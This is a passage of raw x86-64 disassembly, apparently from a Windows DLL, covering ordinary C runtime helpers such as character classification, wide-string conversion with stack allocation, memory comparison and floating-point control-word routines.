   18000c0f4:	41 5e                	pop    %r14
   18000c0f6:	41 5d                	pop    %r13
   18000c0f8:	41 5c                	pop    %r12
   18000c0fa:	5d                   	pop    %rbp
   18000c0fb:	c3                   	ret
   18000c0fc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000c101:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000c106:	57                   	push   %rdi
   18000c107:	48 83 ec 70          	sub    $0x70,%rsp
   18000c10b:	48 8b f2             	mov    %rdx,%rsi
   18000c10e:	48 8b d1             	mov    %rcx,%rdx
   18000c111:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   18000c116:	49 8b d9             	mov    %r9,%rbx
   18000c119:	41 8b f8             	mov    %r8d,%edi
   18000c11c:	e8 d3 9d ff ff       	call   0x180005ef4
   18000c121:	8b 84 24 c0 00 00 00 	mov    0xc0(%rsp),%eax
   18000c128:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   18000c12d:	4c 8b cb             	mov    %rbx,%r9
   18000c130:	89 44 24 40          	mov    %eax,0x40(%rsp)
   18000c134:	8b 84 24 b8 00 00 00 	mov    0xb8(%rsp),%eax
   18000c13b:	44 8b c7             	mov    %edi,%r8d
   18000c13e:	89 44 24 38          	mov    %eax,0x38(%rsp)
   18000c142:	8b 84 24 b0 00 00 00 	mov    0xb0(%rsp),%eax
   18000c149:	48 8b d6             	mov    %rsi,%rdx
   18000c14c:	89 44 24 30          	mov    %eax,0x30(%rsp)
   18000c150:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   18000c157:	00 
   18000c158:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   18000c15d:	8b 84 24 a0 00 00 00 	mov    0xa0(%rsp),%eax
   18000c164:	89 44 24 20          	mov    %eax,0x20(%rsp)
   18000c168:	e8 a3 fc ff ff       	call   0x18000be10
   18000c16d:	80 7c 24 68 00       	cmpb   $0x0,0x68(%rsp)
   18000c172:	74 0c                	je     0x18000c180
   18000c174:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   18000c179:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   18000c180:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   18000c185:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   18000c189:	49 8b 73 18          	mov    0x18(%r11),%rsi
   18000c18d:	49 8b e3             	mov    %r11,%rsp
   18000c190:	5f                   	pop    %rdi
   18000c191:	c3                   	ret
   18000c192:	cc                   	int3
   18000c193:	cc                   	int3
   18000c194:	40 55                	rex push %rbp
   18000c196:	41 54                	push   %r12
   18000c198:	41 55                	push   %r13
   18000c19a:	41 56                	push   %r14
   18000c19c:	41 57                	push   %r15
   18000c19e:	48 83 ec 40          	sub    $0x40,%rsp
   18000c1a2:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   18000c1a7:	48 89 5d 40          	mov    %rbx,0x40(%rbp)
   18000c1ab:	48 89 75 48          	mov    %rsi,0x48(%rbp)
   18000c1af:	48 89 7d 50          	mov    %rdi,0x50(%rbp)
   18000c1b3:	48 8b 05 46 ce 00 00 	mov    0xce46(%rip),%rax        # 0x180019000
   18000c1ba:	48 33 c5             	xor    %rbp,%rax
   18000c1bd:	48 89 45 00          	mov    %rax,0x0(%rbp)
   18000c1c1:	44 8b 75 68          	mov    0x68(%rbp),%r14d
   18000c1c5:	33 ff                	xor    %edi,%edi
   18000c1c7:	45 8b f9             	mov    %r9d,%r15d
   18000c1ca:	4d 8b e0             	mov    %r8,%r12
   18000c1cd:	44 8b ea             	mov    %edx,%r13d
   18000c1d0:	45 85 f6             	test   %r14d,%r14d
   18000c1d3:	75 07                	jne    0x18000c1dc
   18000c1d5:	48 8b 01             	mov    (%rcx),%rax
   18000c1d8:	44 8b 70 04          	mov    0x4(%rax),%r14d
   18000c1dc:	f7 5d 70             	negl   0x70(%rbp)
   18000c1df:	41 8b ce             	mov    %r14d,%ecx
   18000c1e2:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   18000c1e6:	1b d2                	sbb    %edx,%edx
   18000c1e8:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   18000c1ed:	83 e2 08             	and    $0x8,%edx
   18000c1f0:	ff c2                	inc    %edx
   18000c1f2:	ff 15 e0 4e 00 00    	call   *0x4ee0(%rip)        # 0x1800110d8
   18000c1f8:	48 63 f0             	movslq %eax,%rsi
   18000c1fb:	85 c0                	test   %eax,%eax
   18000c1fd:	75 07                	jne    0x18000c206
   18000c1ff:	33 c0                	xor    %eax,%eax
   18000c201:	e9 de 00 00 00       	jmp    0x18000c2e4
   18000c206:	7e 77                	jle    0x18000c27f
   18000c208:	48 b8 f0 ff ff ff ff 	movabs $0x7ffffffffffffff0,%rax
   18000c20f:	ff ff 7f 
   18000c212:	48 3b f0             	cmp    %rax,%rsi
   18000c215:	77 68                	ja     0x18000c27f
   18000c217:	48 8d 0c 36          	lea    (%rsi,%rsi,1),%rcx
   18000c21b:	48 8d 41 10          	lea    0x10(%rcx),%rax
   18000c21f:	48 3b c1             	cmp    %rcx,%rax
   18000c222:	76 5b                	jbe    0x18000c27f
   18000c224:	48 8d 0c 75 10 00 00 	lea    0x10(,%rsi,2),%rcx
   18000c22b:	00 
   18000c22c:	48 81 f9 00 04 00 00 	cmp    $0x400,%rcx
   18000c233:	77 31                	ja     0x18000c266
   18000c235:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   18000c239:	48 3b c1             	cmp    %rcx,%rax
   18000c23c:	77 0a                	ja     0x18000c248
   18000c23e:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   18000c245:	ff ff 0f 
   18000c248:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   18000c24c:	e8 3f 94 ff ff       	call   0x180005690
   18000c251:	48 2b e0             	sub    %rax,%rsp
   18000c254:	48 8d 5c 24 30       	lea    0x30(%rsp),%rbx
   18000c259:	48 85 db             	test   %rbx,%rbx
   18000c25c:	74 a1                	je     0x18000c1ff
   18000c25e:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   18000c264:	eb 13                	jmp    0x18000c279
   18000c266:	e8 55 93 ff ff       	call   0x1800055c0
   18000c26b:	48 8b d8             	mov    %rax,%rbx
   18000c26e:	48 85 c0             	test   %rax,%rax
   18000c271:	74 0f                	je     0x18000c282
   18000c273:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   18000c279:	48 83 c3 10          	add    $0x10,%rbx
   18000c27d:	eb 03                	jmp    0x18000c282
   18000c27f:	48 8b df             	mov    %rdi,%rbx
   18000c282:	48 85 db             	test   %rbx,%rbx
   18000c285:	0f 84 74 ff ff ff    	je     0x18000c1ff
   18000c28b:	4c 8b c6             	mov    %rsi,%r8
   18000c28e:	33 d2                	xor    %edx,%edx
   18000c290:	48 8b cb             	mov    %rbx,%rcx
   18000c293:	4d 03 c0             	add    %r8,%r8
   18000c296:	e8 c5 8f ff ff       	call   0x180005260
   18000c29b:	45 8b cf             	mov    %r15d,%r9d
   18000c29e:	4d 8b c4             	mov    %r12,%r8
   18000c2a1:	ba 01 00 00 00       	mov    $0x1,%edx
   18000c2a6:	41 8b ce             	mov    %r14d,%ecx
   18000c2a9:	89 74 24 28          	mov    %esi,0x28(%rsp)
   18000c2ad:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   18000c2b2:	ff 15 20 4e 00 00    	call   *0x4e20(%rip)        # 0x1800110d8
   18000c2b8:	85 c0                	test   %eax,%eax
   18000c2ba:	74 15                	je     0x18000c2d1
   18000c2bc:	4c 8b 4d 60          	mov    0x60(%rbp),%r9
   18000c2c0:	44 8b c0             	mov    %eax,%r8d
   18000c2c3:	48 8b d3             	mov    %rbx,%rdx
   18000c2c6:	41 8b cd             	mov    %r13d,%ecx
   18000c2c9:	ff 15 31 4f 00 00    	call   *0x4f31(%rip)        # 0x180011200
   18000c2cf:	8b f8                	mov    %eax,%edi
   18000c2d1:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   18000c2d5:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   18000c2db:	75 05                	jne    0x18000c2e2
   18000c2dd:	e8 9e 92 ff ff       	call   0x180005580
   18000c2e2:	8b c7                	mov    %edi,%eax
   18000c2e4:	48 8b 4d 00          	mov    0x0(%rbp),%rcx
   18000c2e8:	48 33 cd             	xor    %rbp,%rcx
   18000c2eb:	e8 40 8f ff ff       	call   0x180005230
   18000c2f0:	48 8b 5d 40          	mov    0x40(%rbp),%rbx
   18000c2f4:	48 8b 75 48          	mov    0x48(%rbp),%rsi
   18000c2f8:	48 8b 7d 50          	mov    0x50(%rbp),%rdi
   18000c2fc:	48 8d 65 10          	lea    0x10(%rbp),%rsp
   18000c300:	41 5f                	pop    %r15
   18000c302:	41 5e                	pop    %r14
   18000c304:	41 5d                	pop    %r13
   18000c306:	41 5c                	pop    %r12
   18000c308:	5d                   	pop    %rbp
   18000c309:	c3                   	ret
   18000c30a:	cc                   	int3
   18000c30b:	cc                   	int3
   18000c30c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000c311:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000c316:	57                   	push   %rdi
   18000c317:	48 83 ec 60          	sub    $0x60,%rsp
   18000c31b:	8b f2                	mov    %edx,%esi
   18000c31d:	48 8b d1             	mov    %rcx,%rdx
   18000c320:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   18000c325:	41 8b d9             	mov    %r9d,%ebx
   18000c328:	49 8b f8             	mov    %r8,%rdi
   18000c32b:	e8 c4 9b ff ff       	call   0x180005ef4
   18000c330:	8b 84 24 a0 00 00 00 	mov    0xa0(%rsp),%eax
   18000c337:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   18000c33c:	44 8b cb             	mov    %ebx,%r9d
   18000c33f:	89 44 24 30          	mov    %eax,0x30(%rsp)
   18000c343:	8b 84 24 98 00 00 00 	mov    0x98(%rsp),%eax
   18000c34a:	4c 8b c7             	mov    %rdi,%r8
   18000c34d:	89 44 24 28          	mov    %eax,0x28(%rsp)
   18000c351:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
   18000c358:	00 
   18000c359:	8b d6                	mov    %esi,%edx
   18000c35b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000c360:	e8 2f fe ff ff       	call   0x18000c194
   18000c365:	80 7c 24 58 00       	cmpb   $0x0,0x58(%rsp)
   18000c36a:	74 0c                	je     0x18000c378
   18000c36c:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   18000c371:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   18000c378:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   18000c37d:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   18000c382:	48 83 c4 60          	add    $0x60,%rsp
   18000c386:	5f                   	pop    %rdi
   18000c387:	c3                   	ret
   18000c388:	40 53                	rex push %rbx
   18000c38a:	48 83 ec 40          	sub    $0x40,%rsp
   18000c38e:	8b d9                	mov    %ecx,%ebx
   18000c390:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000c395:	e8 5a 9b ff ff       	call   0x180005ef4
   18000c39a:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   18000c39f:	0f b6 d3             	movzbl %bl,%edx
   18000c3a2:	48 8b 88 08 01 00 00 	mov    0x108(%rax),%rcx
   18000c3a9:	0f b7 04 51          	movzwl (%rcx,%rdx,2),%eax
   18000c3ad:	25 00 80 00 00       	and    $0x8000,%eax
   18000c3b2:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   18000c3b7:	74 0c                	je     0x18000c3c5
   18000c3b9:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   18000c3be:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   18000c3c5:	48 83 c4 40          	add    $0x40,%rsp
   18000c3c9:	5b                   	pop    %rbx
   18000c3ca:	c3                   	ret
   18000c3cb:	cc                   	int3
   18000c3cc:	40 53                	rex push %rbx
   18000c3ce:	48 83 ec 40          	sub    $0x40,%rsp
   18000c3d2:	8b d9                	mov    %ecx,%ebx
   18000c3d4:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000c3d9:	33 d2                	xor    %edx,%edx
   18000c3db:	e8 14 9b ff ff       	call   0x180005ef4
   18000c3e0:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   18000c3e5:	0f b6 d3             	movzbl %bl,%edx
   18000c3e8:	48 8b 88 08 01 00 00 	mov    0x108(%rax),%rcx
   18000c3ef:	0f b7 04 51          	movzwl (%rcx,%rdx,2),%eax
   18000c3f3:	25 00 80 00 00       	and    $0x8000,%eax
   18000c3f8:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   18000c3fd:	74 0c                	je     0x18000c40b
   18000c3ff:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   18000c404:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   18000c40b:	48 83 c4 40          	add    $0x40,%rsp
   18000c40f:	5b                   	pop    %rbx
   18000c410:	c3                   	ret
   18000c411:	cc                   	int3
   18000c412:	cc                   	int3
   18000c413:	cc                   	int3
   18000c414:	cc                   	int3
   18000c415:	cc                   	int3
   18000c416:	cc                   	int3
   18000c417:	cc                   	int3
   18000c418:	cc                   	int3
   18000c419:	cc                   	int3
   18000c41a:	cc                   	int3
   18000c41b:	cc                   	int3
   18000c41c:	cc                   	int3
   18000c41d:	cc                   	int3
   18000c41e:	cc                   	int3
   18000c41f:	cc                   	int3
   18000c420:	cc                   	int3
   18000c421:	cc                   	int3
   18000c422:	cc                   	int3
   18000c423:	cc                   	int3
   18000c424:	cc                   	int3
   18000c425:	cc                   	int3
   18000c426:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000c42d:	00 00 00 
   18000c430:	48 2b d1             	sub    %rcx,%rdx
   18000c433:	49 83 f8 08          	cmp    $0x8,%r8
   18000c437:	72 22                	jb     0x18000c45b
   18000c439:	f6 c1 07             	test   $0x7,%cl
   18000c43c:	74 14                	je     0x18000c452
   18000c43e:	66 90                	xchg   %ax,%ax
   18000c440:	8a 01                	mov    (%rcx),%al
   18000c442:	3a 04 0a             	cmp    (%rdx,%rcx,1),%al
   18000c445:	75 2c                	jne    0x18000c473
   18000c447:	48 ff c1             	inc    %rcx
   18000c44a:	49 ff c8             	dec    %r8
   18000c44d:	f6 c1 07             	test   $0x7,%cl
   18000c450:	75 ee                	jne    0x18000c440
   18000c452:	4d 8b c8             	mov    %r8,%r9
   18000c455:	49 c1 e9 03          	shr    $0x3,%r9
   18000c459:	75 1f                	jne    0x18000c47a
   18000c45b:	4d 85 c0             	test   %r8,%r8
   18000c45e:	74 0f                	je     0x18000c46f
   18000c460:	8a 01                	mov    (%rcx),%al
   18000c462:	3a 04 0a             	cmp    (%rdx,%rcx,1),%al
   18000c465:	75 0c                	jne    0x18000c473
   18000c467:	48 ff c1             	inc    %rcx
   18000c46a:	49 ff c8             	dec    %r8
   18000c46d:	75 f1                	jne    0x18000c460
   18000c46f:	48 33 c0             	xor    %rax,%rax
   18000c472:	c3                   	ret
   18000c473:	1b c0                	sbb    %eax,%eax
   18000c475:	83 d8 ff             	sbb    $0xffffffff,%eax
   18000c478:	c3                   	ret
   18000c479:	90                   	nop
   18000c47a:	49 c1 e9 02          	shr    $0x2,%r9
   18000c47e:	74 37                	je     0x18000c4b7
   18000c480:	48 8b 01             	mov    (%rcx),%rax
   18000c483:	48 3b 04 0a          	cmp    (%rdx,%rcx,1),%rax
   18000c487:	75 5b                	jne    0x18000c4e4
   18000c489:	48 8b 41 08          	mov    0x8(%rcx),%rax
   18000c48d:	48 3b 44 0a 08       	cmp    0x8(%rdx,%rcx,1),%rax
   18000c492:	75 4c                	jne    0x18000c4e0
   18000c494:	48 8b 41 10          	mov    0x10(%rcx),%rax
   18000c498:	48 3b 44 0a 10       	cmp    0x10(%rdx,%rcx,1),%rax
   18000c49d:	75 3d                	jne    0x18000c4dc
   18000c49f:	48 8b 41 18          	mov    0x18(%rcx),%rax
   18000c4a3:	48 3b 44 0a 18       	cmp    0x18(%rdx,%rcx,1),%rax
   18000c4a8:	75 2e                	jne    0x18000c4d8
   18000c4aa:	48 83 c1 20          	add    $0x20,%rcx
   18000c4ae:	49 ff c9             	dec    %r9
   18000c4b1:	75 cd                	jne    0x18000c480
   18000c4b3:	49 83 e0 1f          	and    $0x1f,%r8
   18000c4b7:	4d 8b c8             	mov    %r8,%r9
   18000c4ba:	49 c1 e9 03          	shr    $0x3,%r9
   18000c4be:	74 9b                	je     0x18000c45b
   18000c4c0:	48 8b 01             	mov    (%rcx),%rax
   18000c4c3:	48 3b 04 0a          	cmp    (%rdx,%rcx,1),%rax
   18000c4c7:	75 1b                	jne    0x18000c4e4
   18000c4c9:	48 83 c1 08          	add    $0x8,%rcx
   18000c4cd:	49 ff c9             	dec    %r9
   18000c4d0:	75 ee                	jne    0x18000c4c0
   18000c4d2:	49 83 e0 07          	and    $0x7,%r8
   18000c4d6:	eb 83                	jmp    0x18000c45b
   18000c4d8:	48 83 c1 08          	add    $0x8,%rcx
   18000c4dc:	48 83 c1 08          	add    $0x8,%rcx
   18000c4e0:	48 83 c1 08          	add    $0x8,%rcx
   18000c4e4:	48 8b 0c 11          	mov    (%rcx,%rdx,1),%rcx
   18000c4e8:	48 0f c8             	bswap  %rax
   18000c4eb:	48 0f c9             	bswap  %rcx
   18000c4ee:	48 3b c1             	cmp    %rcx,%rax
   18000c4f1:	1b c0                	sbb    %eax,%eax
   18000c4f3:	83 d8 ff             	sbb    $0xffffffff,%eax
   18000c4f6:	c3                   	ret
   18000c4f7:	cc                   	int3
   18000c4f8:	48 8b c4             	mov    %rsp,%rax
   18000c4fb:	48 89 58 08          	mov    %rbx,0x8(%rax)
   18000c4ff:	48 89 68 10          	mov    %rbp,0x10(%rax)
   18000c503:	48 89 70 18          	mov    %rsi,0x18(%rax)
   18000c507:	48 89 78 20          	mov    %rdi,0x20(%rax)
   18000c50b:	41 56                	push   %r14
   18000c50d:	48 83 ec 20          	sub    $0x20,%rsp
   18000c511:	48 8b e9             	mov    %rcx,%rbp
   18000c514:	33 ff                	xor    %edi,%edi
   18000c516:	be e3 00 00 00       	mov    $0xe3,%esi
   18000c51b:	4c 8d 35 fe 7d 00 00 	lea    0x7dfe(%rip),%r14        # 0x180014320
   18000c522:	8d 04 3e             	lea    (%rsi,%rdi,1),%eax
   18000c525:	41 b8 55 00 00 00    	mov    $0x55,%r8d
   18000c52b:	48 8b cd             	mov    %rbp,%rcx
   18000c52e:	99                   	cltd
   18000c52f:	2b c2                	sub    %edx,%eax
   18000c531:	d1 f8                	sar    $1,%eax
   18000c533:	48 63 d8             	movslq %eax,%rbx
   18000c536:	48 8b d3             	mov    %rbx,%rdx
   18000c539:	48 03 d2             	add    %rdx,%rdx
   18000c53c:	49 8b 14 d6          	mov    (%r14,%rdx,8),%rdx
   18000c540:	e8 03 01 00 00       	call   0x18000c648
   18000c545:	85 c0                	test   %eax,%eax
   18000c547:	74 13                	je     0x18000c55c
   18000c549:	79 05                	jns    0x18000c550
   18000c54b:	8d 73 ff             	lea    -0x1(%rbx),%esi
   18000c54e:	eb 03                	jmp    0x18000c553
   18000c550:	8d 7b 01             	lea    0x1(%rbx),%edi
   18000c553:	3b fe                	cmp    %esi,%edi
   18000c555:	7e cb                	jle    0x18000c522
   18000c557:	83 c8 ff             	or     $0xffffffff,%eax
   18000c55a:	eb 0b                	jmp    0x18000c567
   18000c55c:	48 8b c3             	mov    %rbx,%rax
   18000c55f:	48 03 c0             	add    %rax,%rax
   18000c562:	41 8b 44 c6 08       	mov    0x8(%r14,%rax,8),%eax
   18000c567:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000c56c:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   18000c571:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   18000c576:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   18000c57b:	48 83 c4 20          	add    $0x20,%rsp
   18000c57f:	41 5e                	pop    %r14
   18000c581:	c3                   	ret
   18000c582:	cc                   	int3
   18000c583:	cc                   	int3
   18000c584:	48 83 ec 28          	sub    $0x28,%rsp
   18000c588:	48 85 c9             	test   %rcx,%rcx
   18000c58b:	74 22                	je     0x18000c5af
   18000c58d:	e8 66 ff ff ff       	call   0x18000c4f8
   18000c592:	85 c0                	test   %eax,%eax
   18000c594:	78 19                	js     0x18000c5af
   18000c596:	48 98                	cltq
   18000c598:	48 3d e4 00 00 00    	cmp    $0xe4,%rax
   18000c59e:	73 0f                	jae    0x18000c5af
   18000c5a0:	48 8d 0d 39 6f 00 00 	lea    0x6f39(%rip),%rcx        # 0x1800134e0
   18000c5a7:	48 03 c0             	add    %rax,%rax
   18000c5aa:	8b 04 c1             	mov    (%rcx,%rax,8),%eax
   18000c5ad:	eb 02                	jmp    0x18000c5b1
   18000c5af:	33 c0                	xor    %eax,%eax
   18000c5b1:	48 83 c4 28          	add    $0x28,%rsp
   18000c5b5:	c3                   	ret
   18000c5b6:	cc                   	int3
   18000c5b7:	cc                   	int3
   18000c5b8:	4c 8b dc             	mov    %rsp,%r11
   18000c5bb:	49 89 5b 08          	mov    %rbx,0x8(%r11)
   18000c5bf:	49 89 73 10          	mov    %rsi,0x10(%r11)
   18000c5c3:	57                   	push   %rdi
   18000c5c4:	48 83 ec 50          	sub    $0x50,%rsp
   18000c5c8:	4c 8b 15 b1 05 01 00 	mov    0x105b1(%rip),%r10        # 0x18001cb80
   18000c5cf:	41 8b d9             	mov    %r9d,%ebx
   18000c5d2:	49 8b f8             	mov    %r8,%rdi
   18000c5d5:	4c 33 15 24 ca 00 00 	xor    0xca24(%rip),%r10        # 0x180019000
   18000c5dc:	8b f2                	mov    %edx,%esi
   18000c5de:	74 2a                	je     0x18000c60a
   18000c5e0:	33 c0                	xor    %eax,%eax
   18000c5e2:	49 89 43 e8          	mov    %rax,-0x18(%r11)
   18000c5e6:	49 89 43 e0          	mov    %rax,-0x20(%r11)
   18000c5ea:	49 89 43 d8          	mov    %rax,-0x28(%r11)
   18000c5ee:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
   18000c5f5:	89 44 24 28          	mov    %eax,0x28(%rsp)
   18000c5f9:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   18000c600:	00 
   18000c601:	49 89 43 c8          	mov    %rax,-0x38(%r11)
   18000c605:	41 ff d2             	call   *%r10
   18000c608:	eb 2d                	jmp    0x18000c637
   18000c60a:	e8 75 ff ff ff       	call   0x18000c584
   18000c60f:	44 8b cb             	mov    %ebx,%r9d
   18000c612:	4c 8b c7             	mov    %rdi,%r8
   18000c615:	8b c8                	mov    %eax,%ecx
   18000c617:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
   18000c61e:	8b d6                	mov    %esi,%edx
   18000c620:	89 44 24 28          	mov    %eax,0x28(%rsp)
   18000c624:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   18000c62b:	00 
   18000c62c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000c631:	ff 15 d1 4b 00 00    	call   *0x4bd1(%rip)        # 0x180011208
   18000c637:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   18000c63c:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   18000c641:	48 83 c4 50          	add    $0x50,%rsp
   18000c645:	5f                   	pop    %rdi
   18000c646:	c3                   	ret
   18000c647:	cc                   	int3
   18000c648:	45 33 c9             	xor    %r9d,%r9d
   18000c64b:	4c 8b d2             	mov    %rdx,%r10
   18000c64e:	4c 8b d9             	mov    %rcx,%r11
   18000c651:	4d 85 c0             	test   %r8,%r8
   18000c654:	74 43                	je     0x18000c699
   18000c656:	4c 2b da             	sub    %rdx,%r11
   18000c659:	43 0f b7 0c 13       	movzwl (%r11,%r10,1),%ecx
   18000c65e:	8d 41 bf             	lea    -0x41(%rcx),%eax
   18000c661:	66 83 f8 19          	cmp    $0x19,%ax
   18000c665:	77 04                	ja     0x18000c66b
   18000c667:	66 83 c1 20          	add    $0x20,%cx
   18000c66b:	41 0f b7 12          	movzwl (%r10),%edx
   18000c66f:	8d 42 bf             	lea    -0x41(%rdx),%eax
   18000c672:	66 83 f8 19          	cmp    $0x19,%ax
   18000c676:	77 04                	ja     0x18000c67c
   18000c678:	66 83 c2 20          	add    $0x20,%dx
   18000c67c:	49 83 c2 02          	add    $0x2,%r10
   18000c680:	49 ff c8             	dec    %r8
   18000c683:	74 0a                	je     0x18000c68f
   18000c685:	66 85 c9             	test   %cx,%cx
   18000c688:	74 05                	je     0x18000c68f
   18000c68a:	66 3b ca             	cmp    %dx,%cx
   18000c68d:	74 ca                	je     0x18000c659
   18000c68f:	0f b7 c2             	movzwl %dx,%eax
   18000c692:	44 0f b7 c9          	movzwl %cx,%r9d
   18000c696:	44 2b c8             	sub    %eax,%r9d
   18000c699:	41 8b c1             	mov    %r9d,%eax
   18000c69c:	c3                   	ret
   18000c69d:	cc                   	int3
   18000c69e:	cc                   	int3
   18000c69f:	cc                   	int3
   18000c6a0:	cc                   	int3
   18000c6a1:	cc                   	int3
   18000c6a2:	cc                   	int3
   18000c6a3:	cc                   	int3
   18000c6a4:	cc                   	int3
   18000c6a5:	cc                   	int3
   18000c6a6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000c6ad:	00 00 00 
   18000c6b0:	48 83 ec 08          	sub    $0x8,%rsp
   18000c6b4:	0f ae 1c 24          	stmxcsr (%rsp)
   18000c6b8:	8b 04 24             	mov    (%rsp),%eax
   18000c6bb:	48 83 c4 08          	add    $0x8,%rsp
   18000c6bf:	c3                   	ret
   18000c6c0:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   18000c6c4:	0f ae 54 24 08       	ldmxcsr 0x8(%rsp)
   18000c6c9:	c3                   	ret
   18000c6ca:	0f ae 5c 24 08       	stmxcsr 0x8(%rsp)
   18000c6cf:	b9 c0 ff ff ff       	mov    $0xffffffc0,%ecx
   18000c6d4:	21 4c 24 08          	and    %ecx,0x8(%rsp)
   18000c6d8:	0f ae 54 24 08       	ldmxcsr 0x8(%rsp)
   18000c6dd:	c3                   	ret
   18000c6de:	66 0f 2e 05 ea a0 00 	ucomisd 0xa0ea(%rip),%xmm0        # 0x1800167d0
   18000c6e5:	00 
   18000c6e6:	73 14                	jae    0x18000c6fc
   18000c6e8:	66 0f 2e 05 e8 a0 00 	ucomisd 0xa0e8(%rip),%xmm0        # 0x1800167d8
   18000c6ef:	00 
   18000c6f0:	76 0a                	jbe    0x18000c6fc
   18000c6f2:	f2 48 0f 2d c8       	cvtsd2si %xmm0,%rcx
   18000c6f7:	f2 48 0f 2a c1       	cvtsi2sd %rcx,%xmm0
   18000c6fc:	c3                   	ret
   18000c6fd:	cc                   	int3
   18000c6fe:	cc                   	int3
   18000c6ff:	cc                   	int3
   18000c700:	cc                   	int3
   18000c701:	cc                   	int3
   18000c702:	cc                   	int3
   18000c703:	cc                   	int3
   18000c704:	cc                   	int3
   18000c705:	cc                   	int3
   18000c706:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000c70d:	00 00 00 
   18000c710:	48 81 ec d8 04 00 00 	sub    $0x4d8,%rsp
   18000c717:	4d 33 c0             	xor    %r8,%r8
   18000c71a:	4d 33 c9             	xor    %r9,%r9
   18000c71d:	48 89 64 24 20       	mov    %rsp,0x20(%rsp)
   18000c722:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   18000c727:	e8 4a 39 00 00       	call   0x180010076
   18000c72c:	48 81 c4 d8 04 00 00 	add    $0x4d8,%rsp
   18000c733:	c3                   	ret
   18000c734:	cc                   	int3
   18000c735:	cc                   	int3
   18000c736:	cc                   	int3
   18000c737:	cc                   	int3
   18000c738:	cc                   	int3
   18000c739:	cc                   	int3
   18000c73a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   18000c740:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   18000c745:	48 89 54 24 18       	mov    %rdx,0x18(%rsp)
   18000c74a:	44 89 44 24 10       	mov    %r8d,0x10(%rsp)
   18000c74f:	49 c7 c1 20 05 93 19 	mov    $0x19930520,%r9
   18000c756:	eb 08                	jmp    0x18000c760
   18000c758:	cc                   	int3
   18000c759:	cc                   	int3
   18000c75a:	cc                   	int3
   18000c75b:	cc                   	int3
   18000c75c:	cc                   	int3
   18000c75d:	cc                   	int3
   18000c75e:	66 90                	xchg   %ax,%ax
   18000c760:	c3                   	ret
   18000c761:	cc                   	int3
   18000c762:	cc                   	int3
   18000c763:	cc                   	int3
   18000c764:	cc                   	int3
   18000c765:	cc                   	int3
   18000c766:	cc                   	int3
   18000c767:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   18000c76e:	00 00 
   18000c770:	c3                   	ret
   18000c771:	cc                   	int3
   18000c772:	cc                   	int3
   18000c773:	cc                   	int3
   18000c774:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000c779:	57                   	push   %rdi
   18000c77a:	48 83 ec 20          	sub    $0x20,%rsp
   18000c77e:	8b 05 dc f2 00 00    	mov    0xf2dc(%rip),%eax        # 0x18001ba60
   18000c784:	33 db                	xor    %ebx,%ebx
   18000c786:	bf 14 00 00 00       	mov    $0x14,%edi
   18000c78b:	85 c0                	test   %eax,%eax
   18000c78d:	75 07                	jne    0x18000c796
